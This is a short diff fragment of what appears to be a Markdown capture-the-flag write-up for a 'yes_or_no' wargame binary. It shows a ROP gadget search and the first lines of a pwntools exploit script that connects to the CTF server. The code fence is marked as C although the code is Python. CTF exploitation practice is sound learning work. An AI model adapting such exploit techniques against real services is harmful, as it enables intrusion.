@@ -260,7 +260,7 @@ kimdong@ubuntu  ~/Wargame  ./rp-lin-x64 -f yes_or_no -r 1 |grep "ret"
 ---
 
 ## Exploit Code
-
+```c
 from pwn import *
 p = remote ("ctf.j0n9hyun.xyz",3009)
 e = ELF("./yes_or_no")
